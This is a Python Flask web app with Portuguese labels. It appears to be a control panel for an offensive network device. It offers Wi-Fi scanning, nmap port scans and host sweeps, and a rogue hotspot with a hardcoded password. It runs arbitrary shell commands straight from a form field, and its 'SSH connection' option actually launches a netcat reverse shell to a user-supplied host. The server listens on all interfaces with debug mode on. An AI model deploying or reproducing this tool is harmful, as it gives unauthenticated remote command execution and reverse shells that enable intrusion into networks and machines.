from flask import Flask, render_template, request, redirect, url_for
import subprocess
import paramiko
import threading

app = Flask(__name__)

wifi_device = "wlan0"  # Alterar conforme necessário para o seu dispositivo WiFi

def hotspot_exists(connection_name):
    try:
        result = subprocess.run(["nmcli", "con", "show"], capture_output=True, text=True)
        return connection_name in result.stdout
    except Exception as e:
        return False

def get_hotspot_interface(connection_name):
    try:
        result = subprocess.run(["nmcli", "-t", "-f", "GENERAL.DEVICES", "con", "show", connection_name], capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        return None
    
def run_reverse_shell(ip, port):
    command = f"nc {ip} {port} -e /bin/bash"
    subprocess.run(command, shell=True)

@app.route('/')
def home():
    options = [
        {'name': 'Configurar Wi-Fi', 'route': '/opcao1'},
        {'name': 'Executar um comando de Shell', 'route': '/opcao2'},
        {'name': 'Estabelecer conexão ssh', 'route': '/opcao3'},
        {'name': 'Realizar scan de portas', 'route': '/opcao4'},
        {'name': 'Realizar enumeração de hosts', 'route': '/opcao5'},
        {'name': 'Criar hotspot', 'route': '/opcao6'},
    ]
    return render_template('index.html', options=options)

@app.route('/opcao1', methods=['GET', 'POST'])
def opcao1():
    if request.method == 'POST':
        device = request.form['device']
        ssids = []
        try:
            result = subprocess.check_output([
                "nmcli", "--colors", "no", "-m", "multiline", "--get-value", "SSID", "dev", "wifi", "list", "ifname", device
            ])
            ssids = [ssid.replace("SSID:", "").strip() for ssid in result.decode().split('\n') if ssid.strip()]
        except subprocess.CalledProcessError:
            ssids = []

        return render_template('wifi_list.html', ssids=ssids, device=device)

    # Quando o método é GET, apenas exibe o formulário de seleção
    return '''
        <form action="/opcao1" method="post">
            <label for="device">Escolha um adaptador WiFi:</label>
            <select name="device" id="device">
                <option value="wlan0">wlan0</option>
                <option value="wlan1">wlan1</option>
            </select>
            <input type="submit" value="Buscar Redes">
        </form>
    '''

@app.route('/opcao2', methods=['GET', 'POST'])
def opcao2():
    if request.method == 'POST':
        command = request.form['command']
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return render_template('command_output.html', output=output.decode())
        except subprocess.CalledProcessError as e:
            return render_template('command_output.html', output=e.output.decode())
    
    return render_template('command_input.html')

@app.route('/opcao3', methods=['GET', 'POST'])
def opcao3():
    if request.method == 'POST':
        ip = request.form['ip']
        port = request.form['port']

        # Inicia a thread para executar o comando de forma assíncrona
        thread = threading.Thread(target=run_reverse_shell, args=(ip, port))
        thread.start()
        # Redireciona o navegador para a página inicial
        return redirect(url_for('home'))

    return render_template('reverse_shell_input.html')
@app.route('/opcao4', methods=['GET', 'POST'])
def opcao4():
    if request.method == 'POST':
        host = request.form['host']
        ports = request.form['ports']
        
        # Construindo o comando nmap
        nmap_command = ["nmap", host, "-p", ports]
        try:
            result = subprocess.check_output(nmap_command, stderr=subprocess.STDOUT)
            output = result.decode()
        except subprocess.CalledProcessError as e:
            output = f"Erro ao executar nmap: {e.output.decode()}"
        
        return render_template('nmap_output.html', output=output)
    
    return render_template('nmap_input.html')


@app.route('/opcao5', methods=['GET', 'POST'])
def opcao5():
    if request.method == 'POST':
        network = request.form['network']
        
        # Construindo o comando nmap
        nmap_command = ["nmap", network, "-sP"]
        try:
            result = subprocess.check_output(nmap_command, stderr=subprocess.STDOUT)
            output = result.decode()
        except subprocess.CalledProcessError as e:
            output = f"Erro ao executar nmap: {e.output.decode()}"
        
        return render_template('nmap_enum_output.html', output=output)
    
    return render_template('nmap_enum_input.html')

@app.route('/opcao6', methods=['GET', 'POST'])
def opcao6():
    if request.method == 'POST':
        device = request.form['device']
        ssid = "MyHotspot"
        password = "MinhaSenha123"
        connection_name = "my-hotspot"

        if hotspot_exists(connection_name):
            current_device = get_hotspot_interface(connection_name)
            if current_device:
                subprocess.run(["nmcli", "con", "delete", connection_name], check=True)

        try:
            subprocess.run(["nmcli", "con", "add", "type", "wifi", "ifname", device, "con-name", connection_name, "autoconnect", "yes", "ssid", ssid], check=True)
            subprocess.run(["nmcli", "con", "modify", connection_name, "802-11-wireless.mode", "ap", "802-11-wireless.band", "bg", "ipv4.method", "shared"], check=True)
            subprocess.run(["nmcli", "con", "modify", connection_name, "wifi-sec.key-mgmt", "wpa-psk"], check=True)
            subprocess.run(["nmcli", "con", "modify", connection_name, "wifi-sec.psk", password], check=True)
            subprocess.run(["nmcli", "con", "up", connection_name], check=True)
            return f"Hotspot '{ssid}' recriado com sucesso na interface {device}."
        except subprocess.CalledProcessError as e:
            return f"Erro ao criar hotspot: {e.stderr}"
    
    return '''
        <form action="/opcao6" method="post">
            <label for="device">Escolha um adaptador WiFi:</label>
            <select name="device" id="device">
                <option value="wlan0">wlan0</option>
                <option value="wlan1">wlan1</option>
            </select>
            <p/>
            <input type="submit" value="Criar/Recriar Hotspot">
        </form>
    '''


@app.route('/submit', methods=['POST'])
def submit():
    if request.method == 'POST':
        ssid = request.form['ssid']
        password = request.form['password']
        device = request.form['device']
        
        connection_command = ["nmcli", "device", "wifi", "connect", ssid, "ifname", device]
        if password:
            connection_command += ["password", password]
        
        result = subprocess.run(connection_command, capture_output=True, text=True)
        
        if result.stderr:
            return f"Erro: falha ao conectar à rede WiFi: <i>{result.stderr}</i>"
        elif result.stdout:
            return f"Sucesso: <i>{result.stdout}</i>"
        
        return "Erro: falha ao conectar."


# Resto das rotas para as outras opções

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
